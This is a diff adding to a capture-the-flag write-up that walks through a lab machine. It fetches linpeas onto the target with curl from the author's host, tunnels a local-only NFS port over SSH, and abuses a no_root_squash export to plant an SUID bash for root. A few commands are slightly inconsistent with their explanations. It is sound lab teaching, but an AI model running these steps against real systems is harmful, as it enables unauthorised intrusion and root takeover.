@@ -45,6 +45,66 @@ I copied the public key's content and paste it on "/home/paradox/.ssh/authorized
 ssh -i id_ed25519 paradox@10.82.158.10
 ```
 I used the private key in there.  
+----
+I didn't find any important thing on this user and I also cannot access the files of other users so I used linpeas.sh file in there. I forwarded it from my terminal "python3 http.server 8000" to there "curl http://192.168.167.246/linpeas.sh".  
+When I look at the output, I noticed a hint on there:
+```bash
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
+```
+It is a way that will help us on Privilege Esc step.  
+What is NFS? It stands for Network File System. It is a protocol that allows files and directories to be shared across network. It enables remote systems to access files as if they were stored locally. But there is so much vulnerability right now.
+1. /home/james -> This is the directory being shared over NFS.  
+2. * -> The share is accessible from any IP address, making it highly insecure.  
+3. rw -> Read & write access is granted, meaning remote users can modify files.  
+4. fsid=0 -> This marks the directory as the root of the NFS export (important for mounting).  
+5. sync -> Ensures all writes are committed to disk before acknowledgment (avoids data corruption).  
+6. no_root_squash -> Disables root squashing, allowing the root user from a remote system to be treated as root on the target machine as well. Huge security risk!
+----  
+By default, NFS operates on port 2049, but I wanted to be sure. So i used this command:  
+```bash
+rpcinfo -p
+```
+I tried to connect it but it wasn't accessible externally, it is only accessible from within the target machine - localhost. So, I need to create an SSH tunnel to forward the local NFS port (2049) to our machine. SSH tunneling allows us to securely forward network traffic from a remote machine to our local machine. This technique is useful when services are only accessible locally on the target but we need to interact with them remotely. To establish a tunnel we run this command on our own terminal:
+```bash
+ssh -L 1111:127.0.0.1:2049 paradox@10.82.158.10 -i id_ed25519
+```
+Yeah after connecting by this command, we can mount the shared folder to our system. Mount by this command on my own terminal again. Then, you can check if it is successful by opening your folder like: ls -la /home/faridd/Downloads/overpass3  
+```bash
+sudo mount -t nfs -o port=1111,nolock 127.0.0.1:/ /home/faridd/Downloads/overpass3
+```
+1. sudo mount -> Runs the mount command with root privileges.
+2. -o port=1111 -> Specifies that we are using our forwarded port 1111 instead of the default NFS port (2049).
+3. -t nfs -> Defines the filesystem type as NFS.
+4. 127.0.0.1:/home/james -> Indicates that we are mounting the /home/james directory from the remote system (now accessible via 127.0.0.1).
+5. /home/faridd/Downloads/overpass3 -> The local directory where we mount the remote NFS share.
+
+Then, I access my local directory:
+```bash
+cd /home/faridd/Downloads/overpass3
+```
+I got the user flag from there. Now, i need to be james. There is a RSA key on /home/faridd/Downloads/overpass3/.ssh
+----
+# PRIVILEGE ESCALATION
+In this step, I will use no_root_squash vulnerability to be root. 
+1. Our goal is to create a program on the server that, when run by a normal user, gives us root access. We use the SUID (Set User ID) method. We use the server's bash to ensure it is compatible with the server's libraries.
+```bash
+[james@ip-10-82-158-10 ~]$ cp /bin/bash /home/james/bash
+```
+2. We set the root permission and SUID permission to this file from our own terminal:
+```bash
+┌──(faridd㉿Ferid)-[~/Downloads/overpass3/.ssh]
+└─$ sudo chown root:root /home/faridd/Downloads/overpass3/bash                    
+┌──(faridd㉿Ferid)-[~/Downloads/overpass3/.ssh]
+└─$ sudo chmod +s /home/faridd/Downloads/overpass3/bash
+```
+3. We return to our normal user session (James) and execute our prepared file.
+```bash
+/home/james/bash -p
+```
+We are root right now. Yeah after reading the root flag, the CTF finishes.
+We learned what is NFS, how to trick the system to connect NFS connection that is closed for externals, how to work with shared folders from our own terminal, improve privilege esc and discovery abilities.
 
 
 
